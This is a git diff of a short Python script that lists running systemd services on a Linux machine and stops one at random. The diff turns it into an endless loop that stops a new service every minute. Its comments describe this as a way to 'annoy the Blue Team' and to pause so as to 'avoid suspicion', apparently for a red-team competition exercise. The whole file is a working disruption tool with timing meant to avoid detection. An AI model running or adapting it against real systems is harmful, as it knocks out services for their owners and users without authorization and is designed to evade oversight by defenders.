@@ -1,13 +1,20 @@
 import subprocess
 import random
+import time
 
 
 def get_services():
+    """
+    Runs systemctl command on a Linux machine to gather all services that are currently active and running
+    """
     output = subprocess.Popen(["systemctl", "--type=service", "--state=running"], stdout=subprocess.PIPE)
     output = output.stdout.read().decode()
     return output
 
 def select_service(list_of_services_string):
+    """
+    Takes the output of get_services and parses out the relevant service information, specifically returning its name
+    """
     service_list = list_of_services_string.split()
     # Sorts through all strings for services
     service_list = [service for service in service_list if ".service" in service]
@@ -20,13 +27,32 @@ def select_service(list_of_services_string):
     return service_name
 
 def disable_service(service_name):
+    """
+    Takes a service name and disables it on the machine
+    """
     process = subprocess.Popen(["systemctl", "stop", service_name])
     process.communicate()
-    
+
+def wait(time_to_wait):
+    """
+    Pauses script execution for desired amount of time
+    """
+    time.sleep(time_to_wait)
+
 def main():
-    services = get_services()
-    service = select_service(services)
-    print(service, "is being disabled")
-    disable_service(service)
+    # Run always to disable services constantly and annoy the Blue Team. 
+    while(True):
+        # Get new list of services every time so all attackable services are available
+        services = get_services()
+        # If all services are down, wait to do anything
+        if(len(services) == 0):
+            wait(300)
+            continue
+        # Randomly select a service from the service list
+        service = select_service(services)
+        # Disable the service
+        disable_service(service)
+        # Wait to avoid suspicion
+        wait(60)
 
 main()
